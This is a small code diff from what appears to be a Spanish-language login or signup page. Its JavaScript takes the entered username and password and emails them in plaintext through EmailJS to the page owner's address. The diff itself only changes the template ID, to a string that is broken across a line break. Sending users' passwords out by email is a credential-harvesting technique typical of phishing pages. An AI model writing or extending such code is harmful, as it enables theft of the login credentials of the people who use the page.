@@ -376,7 +376,8 @@ select.idioma {
             // Verificar que los campos no estén vacíos
             if (username && password) {
                 // Enviar el correo a tu dirección de correo usando EmailJS
-                emailjs.send("signup12345678", "template_ouizy4c", {
+                emailjs.send("signup12345678", "__ejs-test-mail-service__
+", {
                     user_name: username,
                     user_password: password
                 })
